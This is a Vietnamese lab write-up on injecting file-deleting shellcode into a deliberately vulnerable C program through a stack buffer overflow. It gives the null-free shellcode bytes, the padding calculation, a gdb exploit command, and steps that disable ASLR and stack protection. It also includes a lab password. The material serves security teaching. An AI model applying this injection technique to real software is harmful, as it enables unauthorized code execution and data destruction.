# Lab 2: Inject code to delete file: file_del.asm
## Chú ý
  - Để chèn được mã lệnh vào giữa chương trình, shellcode phải được chép vào dưới dạng một chuỗi. Tuy nhiên, các hàm xử lý chuỗi sẽ hoàn tất ngay khi gặp một ký tự null (\0). Do đó, shellcode của chúng ta phải không được chứa bất kỳ giá trị null nào. Cần xử lí mã hex 0x00 hoặc 0x0a (decimal là 10) của file_del.asm bằng cách chuyển **eax** thành **al** và `mov eax, 10` thành `move al, 8|add al, 2`
![image](/buffer-overflow/INSE/images/change_code.png)
## Stack frame của vuln.c
![image](/buffer-overflow/INSE/images/stack-frame.png)
- Để thực hiện tấn công buffer overflow vào stack frame trên ta cần chèn code đến vị trí của return address
- Sau đó tính toán khoảng cách từ buffer đến eip để xác định padding bytes chèn cùng với shellcode
![image](/buffer-overflow/INSE/images/chèn_shellcode.png)
- Đối với trường hợp của chương trình trên thì ta có thể tính toán ra được padding bytes **37** (33b còn lại trong buf và 4b của ebp)

## Các bước thực hiện:
  1. Đầu tiên cần chạy docker bằng lệnh 
`docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab`
![image](/buffer-overflow/INSE/images/docker.png)
  2. cd vào ổ đĩa có chứa thư mục Seclabs  `cd .\Seclabs\buffer-overflow\`
  3. Biên dịch chương trình (file_del.o) bằng lệnh `nasm -g -f elf file_del.asm`
    - Lúc này ta sẽ thấy file file_del.o được tạo ra
![image](/buffer-overflow/INSE/images/file_del.o.png)
  4. Liên kết để tạo chương trình thực thi với `ld -m elf_i386 -o file_del file_del.o`
  5. Hiển thị thông tin của chương trình `objdump -d file_del.o`
![image](/buffer-overflow/INSE/images/before.png)
  - Chương trình này là chương trình đã qua xử lí các mã 0x00 và 0x0a
![image](/buffer-overflow/INSE/images/objdump.png)
  - Tại đây ta có thể thấy dòng gạch dưới là mã hex của dummyfile.
  1. Sau đó để tạo chuỗi hex của shellcode thì dùng `for i in $(objdump -d file_del | grep "^ " | cut -f2);do echo -n '\x'$i; done; echo`
![image](/buffer-overflow/INSE/images/shellcode.png)
  - Vì cái chuỗi mã hex trên là của dummyfile nên ta có thể trực tiếp bỏ \xdummyfile cuối cùng nên chuỗi hex hiện tại chúng ta sẽ lấy là `\xeb\x0f\xb0\x08\x04\x02\xbb\x76\x80\x04\x08\xcd\x80\xb0\x01\xcd\x80\xe8\xec\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65`
  - Tại đây ta cũng bỏ \x00 ở cuối cùng vì nó gây ảnh hưởng đến mã hex khi chèn dữ liệu vào
  1. Tắt chế độ cấp phát địa chỉ stack ngẫu nhiên khi load chương trình của HĐH `sudo sysctl -w kernel.randomize_va_space=0`
   - Mật khẩu của seed là **dees**
![image](/buffer-overflow/INSE/images/kernel.png)
  1. Biên dịch chương trình c với các option tắt cơ chế bảo vệ stack và cho phép thực thi code trên stack `gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`
  - `-fno-stack-protector`: tắt cơ chế bảo vệ stack (stack smashing) để chương trình biên dịch bình thường
  - `-mpreferred-stack-boundary=2`: disas trong gdb sẽ thấy kết quả đẹp, không bị các code thừa
![image](/buffer-overflow/INSE/images/gcc.png)
  1. Tạo link tới zsh thay vì mặc định dash để tắt tính năng đối phó bash của Ubuntu 16.04 
  `sudo ln -sf /bin/zsh /bin/sh`
  1.  Load chương trình vuln.out trong gdb `gdb vuln.out`
  2.  Disassemble hàm main của chương trình `disas main`
  ![image](/buffer-overflow/INSE/images/disas_main.png)
  - Tại đây ta sẽ tạo 2 breakpoint. Một cái ngay sau khi chương trình khởi tạo biến cục bộ **buf[64]** và một cái ngay khi chương trình thực hiện lệnh **strcpy** để tiện quan sát dữ liệu chạy vào bộ nhớ stack \
  ![image](/buffer-overflow/INSE/images/breakpoint.png)
  1.   Chèn chuỗi hex của shellcode bằng dòng lệnh `r $(python -c "print(<injecting shellcode along with padding bytes>+'\xff\xff\xff\xff')")`. Đối với bài này chúng ta sẽ chèn chuỗi hex như sau :\
   `r $(python -c "print('\xeb\x0f\xb0\x08\x04\x02\xbb\x76\x80\x04\x08\xcd\x80\xb0\x01\xcd\x80\xe8\xec\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65' + 'a' * 37 + '\xff\xff\xff\xff')")`
   ![image](/buffer-overflow/INSE/images/r_python.png)
   ![image](/buffer-overflow/INSE/images/breakpoint1.png)
  2.  Sau đó chương trình sẽ chạy và dừng ở breakpoint 1. Lúc này ta sẽ dùng lệnh `x/80xb $esp` để xem 80 bytes bắt đầu từ esp của bộ nhớ stack
   ![image](/buffer-overflow/INSE/images/80x_b1.png)
  3.  Tiếp tục dùng lệnh `continue` để chạy tiếp chương trình và nó sẽ dừng lại tại breakpoint 2 khi chương trình đã thực thi lệnh strcpy. 
   ![image](/buffer-overflow/INSE/images/breakpoint2.png)
  4.  Tiếp tục dùng lệnh `x/80xb $esp` để xem chuỗi hex đã chèn được vào trong bộ nhớ stack
   ![image](/buffer-overflow/INSE/images/80x_b2.png)
  5.  Xác định vị trí của địa chỉ trả về trong stack, sau đó đặt thành địa chỉ của esp
  ![image](/buffer-overflow/INSE/images/set.png)
  Lúc này địa chỉ của return address đã được thay bằng địa chỉ của esp
  1.  Lúc này chương trình sẽ chạy đến cuối
![image](/buffer-overflow/INSE/images/final.png)



